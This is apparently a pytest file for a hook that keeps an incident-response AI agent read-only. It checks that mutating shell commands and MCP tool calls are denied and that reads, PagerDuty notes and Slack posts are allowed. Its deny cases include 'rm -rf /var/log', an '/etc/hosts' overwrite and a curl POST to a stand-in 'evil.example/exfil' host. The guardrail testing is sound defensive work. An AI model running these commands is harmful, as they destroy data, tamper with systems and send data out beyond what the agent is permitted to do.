"""The read-only contract: block_mutations.py must deny every mutating tool call and allow reads."""
import importlib.util
from pathlib import Path

import pytest

# block_mutations.py lives under .claude/hooks (a dotfile dir), so import it by path.
_HOOK = Path(__file__).resolve().parents[1] / ".claude" / "hooks" / "block_mutations.py"
_spec = importlib.util.spec_from_file_location("block_mutations", _HOOK)
block_mutations = importlib.util.module_from_spec(_spec)
_spec.loader.exec_module(block_mutations)


def _denied(tool_name: str, tool_input: dict) -> bool:
    return block_mutations.decide(tool_name, tool_input)["permissionDecision"] == "deny"


@pytest.mark.parametrize("command", [
    "kubectl delete pod checkout-api-abc",
    "kubectl apply -f deploy.yaml",
    "kubectl scale deployment/checkout-api --replicas=10",
    "kubectl rollout restart deployment/checkout-api",
    "kubectl edit configmap app-config",
    "kubectl exec -it pod -- sh",
    "helm upgrade checkout ./chart",
    "aws ec2 terminate-instances --instance-ids i-123",
    "aws dynamodb update-table --table-name orders",
    "aws s3api put-object --bucket b --key k",
    "aws lambda update-function-configuration --function-name f",
    "git push origin main",
    "git commit -m 'fix'",
    "rm -rf /var/log",
    "sudo systemctl restart nginx",
    "echo pwned > /etc/hosts",
    "curl -X POST https://evil.example/exfil",
])
def test_mutating_bash_is_denied(command):
    assert _denied("Bash", {"command": command}), f"should have blocked: {command}"


@pytest.mark.parametrize("command", [
    "kubectl get pods -n prod -o wide",
    "kubectl describe pod checkout-api-abc",
    "kubectl logs checkout-api-abc --previous",
    "kubectl top pods",
    "kubectl get events --sort-by=.lastTimestamp",
    "aws cloudwatch describe-alarms",
    "aws logs filter-log-events --log-group-name /aws/lambda/f",
    "aws ecs list-services --cluster prod",
    "git log --oneline -20",
    "git diff HEAD~1",
])
def test_readonly_bash_is_allowed(command):
    assert not _denied("Bash", {"command": command}), f"should have allowed: {command}"


@pytest.mark.parametrize("tool", [
    "mcp__pagerduty__manage_incidents",
    "mcp__pagerduty__resolve_incident",
    "mcp__kubernetes__delete_pod",
    "mcp__aws__create_stack",
    "mcp__grafana__update_dashboard",
])
def test_mutating_mcp_is_denied(tool):
    assert _denied(tool, {})


@pytest.mark.parametrize("tool", [
    "mcp__pagerduty__get_incident",
    "mcp__pagerduty__list_incident_notes",
    "mcp__grafana__query_prometheus",
    "mcp__kubernetes__list_pods",
    "mcp__aws__describe_alarms",
])
def test_readonly_mcp_is_allowed(tool):
    assert not _denied(tool, {})


def test_sanctioned_outbound_writes_allowed():
    """The agent's only permitted writes: posting findings to PagerDuty notes + Slack."""
    assert not _denied("mcp__pagerduty__add_note_to_incident", {})
    assert not _denied("mcp__slack__post_message", {})
